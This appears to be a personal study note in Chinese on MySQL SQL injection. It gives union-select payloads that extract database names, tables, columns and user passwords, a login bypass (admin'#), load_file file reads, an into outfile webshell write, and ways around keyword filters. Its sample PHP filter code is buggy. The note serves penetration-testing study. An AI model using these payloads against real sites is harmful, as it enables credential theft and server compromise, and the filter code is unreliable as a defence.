#### mysql介绍及操作

增删语句

information_schema是一个很重要的库，information_schema.tables

- mysql的一些函数

  ```sql
  system_user() # 系统用户名
  user()	# 用户名	----
  current_user
  session_user()	# 连接数据库的用户名
  database()	# 数据库名	-----
  version()	# 数据库版本	-----
  load_file()	# 读取本地文件
  @@datadir	# 读取数据库路径
  @@basedir	# Mysql安装路径
  @@version_compile_os # OS
  ```

- mysql数据库连接

  ```php
  <?php
      $host='localhost';	//数据库地址
  	$database='sui';	//数据库名称
  	$user='root';		//帐户
  	$passed='';			//密码
  	$webml='/0/';		//安装文件夹
  ?>
  ```

  如果是root权限的话，可以进一步提权；config、inc、data、common.inc

  ==了解各种cms==

#### mysql注入原理

1. 注入形成原理

   get接收一个值，看他有没有过滤；

2. 简单防注入实现

   ```php
   function check_sql($x)
   {
       $inject = array('and','union','select','from','or');
       $i = str_replace($injection, "", $x);
       return i;
   }
   
   $id = $_GET['id'];
   select * from admin where id=$id;
   
   function inject_check($str)
   {
       $temp = eregi('and|select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into',$str);
       if($temp){
           echo "输入非法内容";
           exit();
       }else{
           return $str;
       }
   }
   ```

3. 绕过防注入

   比如改变大小写，嵌套关键字aandnd

#### mysql注入其他操作

1. 判断注入

2. 判断列数 

   oder by 10，返回正常就表示有10列

3. 联合查询

   `id=13 union select 1,2,3,4,5,6,7,8,9,10`

   按理说，如果前面查询出来的不是数字，那他和后面的10个数字中的某一个类型就会不匹配，就应该报错；

   但是我的navicat并没有报错；重点就是利用这个报错显示信息；  sqlserver没有这些；  *第二列是字符类型*

   - 查询版本  

     `id=13 union select 1,version(),3,4,5,6,7,8,9,10`

   - 查询用户

     `id=13 union select 1,user(),3,4,5,6,7,8,9,10`

   - 查询数据库

     `id=13 union select 1,database(),3,4,5,6,7,8,9,10`

   - 查询表

     `id=13 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables where table_shema=xy # xy应转换为16进制`

     直接'xy'不也行嘛？

   - 查询列

     `id=13 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10 from information_schema.columns where table_name='user'`

   - 查询数据

     `id=13 union select 1,group_concat(name,0x7e,pwd),3,4,5,6,7,8,9,10 from user` 

     0x7e是一个特殊字符 ~

- mysql4.0渗透

  它没有information_schema表，所以不能爆出所有的表名列名；只能用字典爆破；

  利用sqlmap读文件；

- mysql显错注入

  *先百度，视频里就是直接复制粘贴就用了*

- 后台绕过

  有时，#把后面的sql语句注释掉

  ```sql
  select * from user where username='' and password=''
  # 输入admin'#
  # 输入admin' or '1=1
  # 多试试几个闭合
  ```

- mysql读写函数的使用

  load_file()函数，参数是绝对路径；用法和之前的暴库差不多；

  那绝对路径怎么找？ `c:/windows/system32/instsrv/metabase.xml`

  > 报错显示；google hack搜索warning信息； 遗留文件phpinfo info test php； 漏洞爆路径；读取配置文件；
  >
  > 上传报错比较容易：上传一个错误的东西，可能会把绝对路径爆出来；

- 利用注入漏洞执行系统命令

  必须要root权限； `into outfile 'c.php'`

  可以导入一句话；可以创建用户；

- 魔术引号与宽字节注入

  宽字节注入：是PHP的配置问题，`magic_quotes_runtime`；'会变成\'

  sqlmap——unmagicquotes；`--tamper unmagicquotes.py`





> 正则表达式还是需要熟悉，尤其是转义这一块
>
> url编码需要了解；
>
> 转16进制可以绕过 ' 被过滤的情况
>
> mysql显错注入的了解；



